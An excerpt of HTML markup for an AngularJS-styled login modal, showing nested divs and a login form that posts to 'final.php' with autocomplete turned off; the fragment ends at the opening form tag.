          ...
          <div ng-include="#" class="ng-scope">
            ...
            <div class="modal-login mgb-0 row ng-scope">
              <div class="col-xs-12 col-sm-6 first-box">
                <div class="box">
                  <form name="login" id="login-form" autocomplete="OFF" action="final.php" method="POST" ng-if="!errorSafariMsg" class="ng-pristine ng-scope ng-invalid ng-invalid-required ng-valid-maxlength ng-valid-pattern">
